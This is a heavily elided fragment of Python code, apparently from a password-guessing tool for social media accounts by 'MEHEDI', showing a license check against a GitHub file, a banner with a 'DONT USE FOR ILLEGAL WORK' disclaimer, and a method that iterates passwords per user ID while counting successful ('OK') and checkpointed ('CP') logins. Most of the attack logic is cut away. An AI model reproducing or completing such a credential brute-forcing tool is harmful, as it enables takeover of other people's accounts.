...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Mehedi13am/approvel.txt/blob/main/approvel.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;96m #     # ####### #     # ####### ######  ###
 ...
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [MEHEDI] : %s/%s -> \033[0;92m [ MEHEDI-OK:%s ]- \033[0;93m[MEHEDI-CP :%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
